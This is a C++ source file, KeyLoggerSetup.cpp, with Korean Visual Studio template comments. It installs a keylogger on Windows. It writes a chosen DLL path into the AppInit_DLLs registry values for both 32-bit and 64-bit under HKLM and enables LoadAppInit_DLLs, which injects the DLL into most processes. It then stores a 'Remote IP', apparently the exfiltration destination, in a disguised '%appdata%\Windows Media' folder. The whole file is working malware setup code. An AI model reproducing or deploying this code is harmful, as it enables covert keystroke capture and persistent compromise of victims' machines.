// KeyLoggerSetup.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//

#include <iostream>
#include <fstream>
#include <direct.h>
#include <windows.h>
#include <conio.h>

using namespace std;

int main()
{
	char buff[300] = "";

	HKEY hKey32, hKey64;

	LONG lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		0, KEY_ALL_ACCESS, &hKey32); // 32bit 레지스트리 경로
	if (lResult != ERROR_SUCCESS)
	{
		cout << "32bit Registry Open Error" << endl;
		_getch();
		return 1;
	}

	lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		0, KEY_ALL_ACCESS, &hKey64); // 64bit 레지스트리 경로
	if (lResult != ERROR_SUCCESS)
	{
		cout << "64bit Registry Open Error" << endl;
		_getch();
		return 1;
	}

	cout << "32bit dll path : ";
	cin.getline(buff, 299);

	unsigned long long dwBytes = 1;
	RegSetValueExA(hKey32, "AppInit_DLLs", 0, REG_SZ, (BYTE*)buff, strlen(buff));
	RegSetValueExA(hKey32, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&dwBytes, 4);

	cout << "64bit dll path : ";
	cin.getline(buff, 299);

	RegSetValueExA(hKey64, "AppInit_DLLs", 0, REG_SZ, (BYTE*)buff, strlen(buff));
	RegSetValueExA(hKey64, "LoadAppInit_DLLs", 0, REG_DWORD, (const BYTE*)&dwBytes, 4);

	// %appdata%에 IP등록

	char* appdata;
	char path[150] = "";
	char dir[150] = "";

	_dupenv_s(&appdata, NULL, "appdata");
	strcpy_s(path, appdata);
	strcpy_s(dir, appdata);

	strcat_s(path, "\\Windows Media\\ini");
	strcat_s(dir, "\\Windows Media");

	_mkdir(dir);

	char IP[20] = "";
	std::ofstream st(path);

	cout << "Remote IP : ";  cin >> IP;
	st.write(IP, strlen(IP));

	st.close();
}

// 프로그램 실행: <Ctrl+F5> 또는 [디버그] > [디버깅하지 않고 시작] 메뉴
// 프로그램 디버그: <F5> 키 또는 [디버그] > [디버깅 시작] 메뉴

// 시작을 위한 팁: 
//   1. [솔루션 탐색기] 창을 사용하여 파일을 추가/관리합니다.
//   2. [팀 탐색기] 창을 사용하여 소스 제어에 연결합니다.
//   3. [출력] 창을 사용하여 빌드 출력 및 기타 메시지를 확인합니다.
//   4. [오류 목록] 창을 사용하여 오류를 봅니다.
//   5. [프로젝트] > [새 항목 추가]로 이동하여 새 코드 파일을 만들거나, [프로젝트] > [기존 항목 추가]로 이동하여 기존 코드 파일을 프로젝트에 추가합니다.
//   6. 나중에 이 프로젝트를 다시 열려면 [파일] > [열기] > [프로젝트]로 이동하고 .sln 파일을 선택합니다.
